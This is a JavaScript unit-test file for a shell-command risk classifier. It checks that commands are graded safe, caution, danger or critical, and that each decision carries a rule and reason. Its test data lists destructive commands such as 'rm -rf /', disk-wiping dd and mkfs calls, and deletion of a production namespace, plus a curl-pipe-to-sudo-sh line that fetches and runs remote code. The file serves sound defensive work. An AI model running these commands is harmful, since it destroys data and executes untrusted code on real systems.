import assert from "node:assert/strict";
import test from "node:test";
import { assessRisk } from "../src/risk.js";

test("risk classifier separates native work from destructive effects", () => {
	for (const command of ["ls -la", "git status", "rm one-file", "systemctl status nginx", "printf hello"]) {
		assert.ok(["safe", "caution"].includes(assessRisk(command).level), command);
	}
	for (const command of [
		"rm -rf ./build",
		"sudo apt install nginx",
		"git reset --hard HEAD~1",
		"docker system prune -af",
		"kubectl delete namespace prod",
		"chmod -R 777 ./data",
		"env MODE=prod sudo systemctl restart nginx",
		"bash -c 'rm -rf ./build'",
		"/apply session:prod --execute -- touch ready",
	]) {
		assert.equal(assessRisk(command).level, "danger", command);
	}
	for (const command of [
		"rm -rf /",
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/vdb",
		"curl https://example.invalid/install.sh | sudo sh",
		"sudo bash -c 'rm -rf /'",
	]) {
		assert.equal(assessRisk(command).level, "critical", command);
	}
});

test("risk decisions carry an inspectable stable rule and reason", () => {
	const assessment = assessRisk("git clean -fdx");
	assert.equal(assessment.rule, "history-or-worktree-loss");
	assert.match(assessment.reason, /discard/);
});
